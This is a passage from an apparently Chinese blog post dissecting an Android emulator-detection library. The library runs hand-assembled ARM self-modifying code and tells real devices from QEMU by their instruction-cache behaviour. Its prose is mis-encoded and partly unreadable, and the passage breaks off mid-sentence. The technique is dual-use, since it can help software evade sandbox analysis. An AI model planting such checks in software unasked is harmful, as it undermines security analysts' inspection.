&#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;emulator_check&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Keep</span></span><br><span class="line">    <span class="keyword">native</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">detectS</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åŒæ—¶è€ƒè™‘ç‰¹å¾å€¼è·Ÿcache</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmulator</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> detectS();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//CMakeList.txt</span><br><span class="line"><span class="keyword">add_library</span>(</span><br><span class="line">      <span class="comment"># è®¾ç½®soæ–‡ä»¶åç§°.</span></span><br><span class="line">       emulator_check</span><br><span class="line">       <span class="comment"># è®¾ç½®è¿™ä¸ªsoæ–‡ä»¶ä¸ºå…±äº«.</span></span><br><span class="line">       SHARED</span><br><span class="line">       <span class="comment"># Provides a relative path to your source file(s).</span></span><br><span class="line">       src/main/jni/emulator/emcheck64.c )</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">getArch</span><span class="params">(JNIEnv *env)</span> </span>&#123;</span><br><span class="line">    jclass cls = (*env)-&gt;<span class="built_in">FindClass</span>(env, <span class="string">&quot;com/snail/antifake/jni/EmulatorDetectUtil&quot;</span>);</span><br><span class="line">    jmethodID mid = (*env)-&gt;<span class="built_in">GetStaticMethodID</span>(env, cls, <span class="string">&quot;getSystemArch&quot;</span>, <span class="string">&quot;()I&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (jint) (*env)-&gt;<span class="built_in">CallStaticIntMethod</span>(env, cls, mid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">jboolean JNICALL <span class="title">detect</span><span class="params">(JNIEnv *env, jclass jclass1)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">load</span>(env);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> type = <span class="built_in">getArch</span>(env);</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">0</span> || type == <span class="number">1</span>) &#123; <span class="keyword">return</span> JNI_TRUE; &#125;</span><br><span class="line">    <span class="type">char</span> code32[] =</span><br><span class="line">            <span class="string">&quot;\x04\xe0\x2d\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x20\xA0\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xA0\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x01\x20\x82\xE2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0c\x30\x4f\xe2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x10\x93\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x01\x00\x80\xE2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0c\x30\x4f\xe2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x10\x83\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0A\x00\x50\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x02\x00\x00\xAA&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0A\x00\x52\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\x00\xAA&quot;</span></span><br><span class="line">            <span class="string">&quot;\xf7\xff\xff\xea&quot;</span></span><br><span class="line">            <span class="string">&quot;\x04\xf0\x9d\xE4&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> code64[] =</span><br><span class="line">            <span class="string">&quot;\xff\xc3\x00\xd1&quot;</span><span class="comment">//subsp, sp, #0x30</span></span><br><span class="line">            <span class="string">&quot;\xfd\x7b\x02\xa9&quot;</span><span class="comment">//x29, x30, [sp,#32]</span></span><br><span class="line">            <span class="string">&quot;\x02\x00\x80\xd2&quot;</span><span class="comment">//x2, #0x0</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\x80\xd2&quot;</span><span class="comment">//movx0, #0x0</span></span><br><span class="line">            <span class="string">&quot;\x42\x04\x00\x91&quot;</span><span class="comment">//addx2, x2, #0x1</span></span><br><span class="line">            <span class="string">&quot;\xe3\xff\xff\x10&quot;</span><span class="comment">//adrx3, 18 &lt;smc&gt;</span></span><br><span class="line">            <span class="string">&quot;\x61\x00\x40\xf9&quot;</span><span class="comment">//ldrx1, [x3]</span></span><br><span class="line">            <span class="string">&quot;\x00\x04\x00\x91&quot;</span><span class="comment">//addx0, x0, #0x1</span></span><br><span class="line">            <span class="string">&quot;\xe3\xff\xff\x10&quot;</span><span class="comment">//adrx3, 24 &lt;code&gt;</span></span><br><span class="line">            <span class="string">&quot;\x61\x00\x00\xf9&quot;</span><span class="comment">//strx1, [x3]</span></span><br><span class="line">            <span class="string">&quot;\x1f\x28\x00\xf1&quot;</span> <span class="comment">//cmpx0, #0xa</span></span><br><span class="line">            <span class="string">&quot;\x8a\x00\x00\x54&quot;</span><span class="comment">//b.ge44 &lt;out&gt;</span></span><br><span class="line">            <span class="string">&quot;\x5f\x28\x00\xf1&quot;</span>  <span class="comment">//cmpx2, #0xa</span></span><br><span class="line">            <span class="string">&quot;\x4a\x00\x00\x54&quot;</span><span class="comment">//b.ge44 &lt;out&gt;</span></span><br><span class="line">            <span class="string">&quot;\xf9\xff\xff\x17&quot;</span><span class="comment">//b24 &lt;code&gt;</span></span><br><span class="line">            <span class="string">&quot;\xfd\x7b\x42\xa9&quot;</span><span class="comment">//ldpx29, x30, [sp,#32]</span></span><br><span class="line">            <span class="string">&quot;\xff\xc3\x00\x91&quot;</span><span class="comment">//addsp, sp, #0x30</span></span><br><span class="line">            <span class="string">&quot;\xc0\x03\x5f\xd6&quot;</span> <span class="comment">//ret</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//   LOGI(&quot; start  detect&quot;);</span></span><br><span class="line">    <span class="type">void</span> *exec = <span class="built_in">mmap</span>(<span class="literal">NULL</span>, (<span class="type">size_t</span>) <span class="built_in">getpagesize</span>(), PROT, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>,</span><br><span class="line">                      (<span class="type">off_t</span>) <span class="number">0</span>);</span><br><span class="line"><span class="comment">//    LOGI(&quot; mmap sucess exec  %x  %d &quot;, exec,(size_t) getpagesize());</span></span><br><span class="line">    <span class="keyword">if</span> (exec == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> fd = <span class="built_in">fopen</span>(<span class="string">&quot;/dev/zero&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">        exec = <span class="built_in">mmap</span>(<span class="literal">NULL</span>, (<span class="type">size_t</span>) <span class="built_in">getpagesize</span>(), PROT, MAP_PRIVATE, fd, (<span class="type">off_t</span>) <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (exec == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(exec, code32, <span class="built_in">sizeof</span>(code32));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(exec, code64, <span class="built_in">sizeof</span>(code64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    LOGI(&quot; mmap copy  exec  %x&quot;, exec);</span></span><br><span class="line">    <span class="comment">//å¦‚æœä¸æ˜¯ (size_t) getpagesize() æ˜¯sizeofï¼ˆcodeï¼‰ï¼Œå°±å¿…é¡»åŠ ä¸ŠLOGI(&quot; mmap sucess exec  %x&quot;, exec); ï¼Œæ‰èƒ½é™ä½å´©æºƒæ¦‚ç‡ï¼Œè¿™å°¼ç›æ“è›‹</span></span><br><span class="line">    asmcheck = (<span class="type">int</span> *) exec;</span><br><span class="line">    __clear_cache(exec, exec + (<span class="type">size_t</span>) <span class="built_in">getpagesize</span>());</span><br><span class="line">    a = <span class="built_in">asmcheck</span>();</span><br><span class="line"><span class="comment">//        LOGI(&quot; ret --  %x&quot;, a);</span></span><br><span class="line">    <span class="built_in">munmap</span>(exec, <span class="built_in">getpagesize</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥åˆ°äº†æ£€æµ‹æ¨¡æ‹Ÿå™¨çš„nativeå±‚å‡½æ•°ï¼Œè¯¦ç»†åˆ†æå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> type = getArch(env);</span><br><span class="line"><span class="keyword">if</span> (type == <span class="number">0</span> || type == <span class="number">1</span>) &#123; <span class="keyword">return</span> JNI_TRUE; &#125;</span><br></pre></td></tr></table></figure><ol><li><p><strong>è·å–æ¶æ„</strong>ï¼šä»£ç é¦–å…ˆé€šè¿‡ JNI å›è°ƒ <code>EmulatorDetectUtil.getSystemArch()</code> æ–¹æ³•ã€‚è¿™ä¸ª Java æ–¹æ³•ä¼šè¯»å–ç³»ç»Ÿå±æ€§ <code>ro.product.cpu.abi</code> æ¥è·å–å½“å‰çš„ CPU ABIï¼ˆåº”ç”¨äºŒè¿›åˆ¶æ¥å£ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getSystemArch</span><span class="params">()</span> &#123;</span><br><span class="line">    String cpuAbi=  PropertiesGet.getString(<span class="string">&quot;ro.product.cpu.abi&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;armeabi-v7a&quot;</span>.equals(cpuAbi))</span><br><span class="line">        <span class="keyword">return</span> Arch.ARM32;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;arm64-v8a&quot;</span>.equals(cpuAbi))</span><br><span class="line">        <span class="keyword">return</span> Arch.ARM64;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;x86&quot;</span>.equals(cpuAbi)  )</span><br><span class="line">        <span class="keyword">return</span> Arch.X86;</span><br><span class="line">    <span class="keyword">if</span>(  <span class="string">&quot;x86_64&quot;</span>.equals(cpuAbi))</span><br><span class="line">        <span class="keyword">return</span> Arch.X86_64;</span><br><span class="line">    <span class="keyword">return</span> Arch.ARM64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>åˆ¤æ–­æ¶æ„</strong>ï¼š</p><ul><li><code>type == 0</code> å¯¹åº” <code>x86</code></li><li><code>type == 1</code> å¯¹åº” <code>x86_64</code></li></ul></li><li><p><strong>åˆ¤å®šç»“æœ</strong>ï¼šå¦‚æœæ£€æµ‹åˆ° CPU æ˜¯ x86 æˆ– x86_64 æ¶æ„ï¼Œå‡½æ•°å°±**ç«‹å³è¿”å› <code>JNI_TRUE</code>**ï¼Œåˆ¤å®šå½“å‰ç¯å¢ƒä¸ºæ¨¡æ‹Ÿå™¨</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">char</span> code32[] =</span><br><span class="line">            <span class="string">&quot;\x04\xe0\x2d\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x20\xA0\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xA0\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x01\x20\x82\xE2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0c\x30\x4f\xe2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x10\x93\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x01\x00\x80\xE2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0c\x30\x4f\xe2&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x10\x83\xE5&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0A\x00\x50\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x02\x00\x00\xAA&quot;</span></span><br><span class="line">            <span class="string">&quot;\x0A\x00\x52\xE3&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\x00\xAA&quot;</span></span><br><span class="line">            <span class="string">&quot;\xf7\xff\xff\xea&quot;</span></span><br><span class="line">            <span class="string">&quot;\x04\xf0\x9d\xE4&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> code64[] =</span><br><span class="line">            <span class="string">&quot;\xff\xc3\x00\xd1&quot;</span><span class="comment">//subsp, sp, #0x30</span></span><br><span class="line">            <span class="string">&quot;\xfd\x7b\x02\xa9&quot;</span><span class="comment">//x29, x30, [sp,#32]</span></span><br><span class="line">            <span class="string">&quot;\x02\x00\x80\xd2&quot;</span><span class="comment">//x2, #0x0</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\x80\xd2&quot;</span><span class="comment">//movx0, #0x0</span></span><br><span class="line">            <span class="string">&quot;\x42\x04\x00\x91&quot;</span><span class="comment">//addx2, x2, #0x1</span></span><br><span class="line">            <span class="string">&quot;\xe3\xff\xff\x10&quot;</span><span class="comment">//adrx3, 18 &lt;smc&gt;</span></span><br><span class="line">            <span class="string">&quot;\x61\x00\x40\xf9&quot;</span><span class="comment">//ldrx1, [x3]</span></span><br><span class="line">            <span class="string">&quot;\x00\x04\x00\x91&quot;</span><span class="comment">//addx0, x0, #0x1</span></span><br><span class="line">            <span class="string">&quot;\xe3\xff\xff\x10&quot;</span><span class="comment">//adrx3, 24 &lt;code&gt;</span></span><br><span class="line">            <span class="string">&quot;\x61\x00\x00\xf9&quot;</span><span class="comment">//strx1, [x3]</span></span><br><span class="line">            <span class="string">&quot;\x1f\x28\x00\xf1&quot;</span> <span class="comment">//cmpx0, #0xa</span></span><br><span class="line">            <span class="string">&quot;\x8a\x00\x00\x54&quot;</span><span class="comment">//b.ge44 &lt;out&gt;</span></span><br><span class="line">            <span class="string">&quot;\x5f\x28\x00\xf1&quot;</span>  <span class="comment">//cmpx2, #0xa</span></span><br><span class="line">            <span class="string">&quot;\x4a\x00\x00\x54&quot;</span><span class="comment">//b.ge44 &lt;out&gt;</span></span><br><span class="line">            <span class="string">&quot;\xf9\xff\xff\x17&quot;</span><span class="comment">//b24 &lt;code&gt;</span></span><br><span class="line">            <span class="string">&quot;\xfd\x7b\x42\xa9&quot;</span><span class="comment">//ldpx29, x30, [sp,#32]</span></span><br><span class="line">            <span class="string">&quot;\xff\xc3\x00\x91&quot;</span><span class="comment">//addsp, sp, #0x30</span></span><br><span class="line">            <span class="string">&quot;\xc0\x03\x5f\xd6&quot;</span> <span class="comment">//ret</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">            <span class="string">&quot;\x00\x00\xa0\xe1&quot;</span> <span class="comment">//nop</span></span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//   LOGI(&quot; start  detect&quot;);</span></span><br><span class="line">    <span class="type">void</span> *exec = mmap(<span class="literal">NULL</span>, (<span class="type">size_t</span>) getpagesize(), PROT, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>,</span><br><span class="line">                      (<span class="type">off_t</span>) <span class="number">0</span>);</span><br><span class="line"><span class="comment">//    LOGI(&quot; mmap sucess exec  %x  %d &quot;, exec,(size_t) getpagesize());</span></span><br><span class="line">    <span class="keyword">if</span> (exec == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> fd = fopen(<span class="string">&quot;/dev/zero&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">        exec = mmap(<span class="literal">NULL</span>, (<span class="type">size_t</span>) getpagesize(), PROT, MAP_PRIVATE, fd, (<span class="type">off_t</span>) <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (exec == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(exec, code32, <span class="keyword">sizeof</span>(code32));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(exec, code64, <span class="keyword">sizeof</span>(code64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    LOGI(&quot; mmap copy  exec  %x&quot;, exec);</span></span><br><span class="line">    <span class="comment">//å¦‚æœä¸æ˜¯ (size_t) getpagesize() æ˜¯sizeofï¼ˆcodeï¼‰ï¼Œå°±å¿…é¡»åŠ ä¸ŠLOGI(&quot; mmap sucess exec  %x&quot;, exec); ï¼Œæ‰èƒ½é™ä½å´©æºƒæ¦‚ç‡ï¼Œè¿™å°¼ç›æ“è›‹</span></span><br><span class="line">    asmcheck = (<span class="type">int</span> *) exec;</span><br><span class="line">    __clear_cache(exec, exec + (<span class="type">size_t</span>) getpagesize());</span><br><span class="line">    a = asmcheck();</span><br><span class="line"><span class="comment">//        LOGI(&quot; ret --  %x&quot;, a);</span></span><br><span class="line">    munmap(exec, getpagesize());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a == <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨äº†çœŸå® ARM ç¡¬ä»¶åˆ†ç¦»çš„ I&#x2F;D Cache ä¸ QEMU åŠ¨æ€ç¿»è¯‘å¼•æ“åœ¨å¤„ç†è‡ªä¿®æ”¹ä»£ç æ—¶çš„ç¼“å­˜ä¸€è‡´æ€§è¡Œä¸ºå·®å¼‚æ¥åŒºåˆ†æ¨¡æ‹Ÿå™¨</p><blockquote><p><strong>çœŸæœº (ARM CPU) çš„è¡Œä¸º</strong></p><ul><li><strong>å“ˆä½›&#x2F;æ”¹è¿›å‹å“ˆä½›æ¶æ„ (Harvard&#x2F;Modified Harvard Architecture)<strong>ï¼šç°ä»£é«˜æ€§èƒ½ ARM å†…æ ¸ï¼ˆå¦‚ Cortex-A ç³»åˆ—ï¼‰æ™®éé‡‡ç”¨è¿™ç§æ¶æ„ã€‚å…¶æ ¸å¿ƒç‰¹å¾å°±æ˜¯</strong>æŒ‡ä»¤æ€»çº¿å’Œæ•°æ®æ€»çº¿åˆ†ç¦»</strong>ï¼Œä»è€Œå®ç°äº†ç‹¬ç«‹çš„æŒ‡ä»¤ç¼“å­˜ï¼ˆI-Cacheï¼‰å’Œæ•°æ®ç¼“å­˜ï¼ˆD-Cacheï¼‰ã€‚</li><li><strong>ç¼“å­˜ä¸€è‡´æ€§é—®é¢˜ (Cache Coherency Problem)<strong>ï¼šå½“ä¸€ä¸ª CPU æ ¸å¿ƒæ‰§è¡Œ <code>STR</code> (Store) æŒ‡ä»¤ä¿®æ”¹ä¸€æ®µå†…å­˜æ—¶ï¼Œè¿™ä¸ªå†™æ“ä½œæ˜¯é€šè¿‡æ•°æ®è·¯å¾„è¿›è¡Œçš„ï¼Œå®ƒä¼šæ›´æ–° D-Cache å’Œæœ€ç»ˆçš„ä¸»å­˜ã€‚ç„¶è€Œï¼Œå¦‚æœè¢«ä¿®æ”¹çš„å†…å­˜åŒºåŸŸæ°å¥½ä¹Ÿä½œä¸ºæŒ‡ä»¤è¢«åŠ è½½åˆ°äº† I-Cache ä¸­ï¼Œç¡¬ä»¶æœ¬èº«</strong>ä¸ä¼š</strong>è‡ªåŠ¨ä½¿ I-Cache ä¸­å¯¹åº”çš„ç¼“å­˜è¡Œï¼ˆCache Lineï¼‰å¤±æ•ˆã€‚</li><li><strong><code>__clear_cache</code> çš„å¿…è¦æ€§</strong>ï¼šä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒARM æ¶æ„æä¾›äº†ç‰¹å®šçš„æŒ‡ä»¤ï¼ˆå¦‚ <code>IC IALLU</code>, <code>DC CIVAC</code>ï¼‰å’Œç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆæœ€ç»ˆç”±å†…æ ¸å®ç°ï¼‰ï¼Œå…è®¸è½¯ä»¶æ˜¾å¼åœ°ç®¡ç†ç¼“å­˜ã€‚<code>__clear_cache</code> è¿™ä¸ª GCC å†…å»ºå‡½æ•°ï¼ˆæˆ–ç±»ä¼¼çš„åº“å‡½æ•°ï¼‰å°±æ˜¯ä¸Šå±‚å¯¹è¿™äº›åº•å±‚æ“ä½œçš„å°è£…ã€‚å®ƒçš„ä½œç”¨æ˜¯ï¼š<ol><li>å°† D-Cache ä¸­è¢«ä¿®æ”¹çš„æ•°æ®å†™å›åˆ°ä¸»å­˜ï¼ˆWrite-Back&#x2F;Cleanï¼‰ã€‚</li><li>ä½¿ I-Cache ä¸­è¦†ç›–äº†ç›¸åŒå†…å­˜åœ°å€çš„ç¼“å­˜è¡Œå¤±æ•ˆï¼ˆInvalidateï¼‰ã€‚ è¿™æ ·ï¼Œå½“ CPU å†æ¬¡ä»è¯¥åœ°å€å–æŒ‡æ—¶ï¼Œç”±äº I-Cache Missï¼Œå®ƒä¼šä»ä¸»å­˜ä¸­é‡æ–°åŠ 